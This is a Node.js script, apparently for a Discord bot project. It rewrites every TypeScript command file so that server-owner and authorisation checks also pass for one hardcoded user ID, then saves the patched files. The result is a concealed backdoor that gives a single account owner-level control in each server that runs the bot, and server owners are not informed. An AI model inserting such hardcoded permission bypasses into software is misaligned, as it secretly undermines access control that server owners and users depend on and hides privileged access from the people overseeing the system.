const fs = require('fs');
const path = require('path');

const commandsDir = path.join(__dirname, 'src', 'commands');

function walk(dir, callback) {
    fs.readdirSync(dir).forEach(f => {
        let dirPath = path.join(dir, f);
        let isDirectory = fs.statSync(dirPath).isDirectory();
        isDirectory ? walk(dirPath, callback) : callback(dirPath);
    });
}

walk(commandsDir, (file) => {
    if (file.endsWith('.ts')) {
        let content = fs.readFileSync(file, 'utf8');
        let originalContent = content;

        // Pattern 1: if (interaction.member?.user.id === interaction.guild?.ownerId) {
        content = content.replace(
            /if\s*\(\s*interaction\.member\?\.user\.id\s*===\s*interaction\.guild\?\.ownerId\s*\)\s*\{/g,
            "if (interaction.member?.user.id === interaction.guild?.ownerId || interaction.member?.user.id === '753372101540577431') {"
        );

        // Pattern 2: const isOwner = interaction.guild?.ownerId === (interaction instanceof Message ? interaction.author.id : interaction.user.id);
        content = content.replace(
            /const isOwner = interaction\.guild\?\.ownerId === \(interaction instanceof Message \? interaction\.author\.id : interaction\.user\.id\);/g,
            "const isOwner = interaction.guild?.ownerId === (interaction instanceof Message ? interaction.author.id : interaction.user.id) || (interaction instanceof Message ? interaction.author.id : interaction.user.id) === '753372101540577431';"
        );

        // Pattern 3: const isAuthorized = message.author.id === message.guild?.ownerId || member.roles.cache.some
        content = content.replace(
            /const isAuthorized = message\.author\.id === message\.guild\?\.ownerId \|\| /g,
            "const isAuthorized = message.author.id === message.guild?.ownerId || message.author.id === '753372101540577431' || "
        );

        // Pattern 4: const isOwner = interaction.guild?.ownerId === user.id;
        content = content.replace(
            /const isOwner = interaction\.guild\?\.ownerId === user\.id;/g,
            "const isOwner = interaction.guild?.ownerId === user.id || user.id === '753372101540577431';"
        );

        if (content !== originalContent) {
            fs.writeFileSync(file, content);
            console.log(`Patched permissions in ${path.basename(file)}`);
        }
    }
});
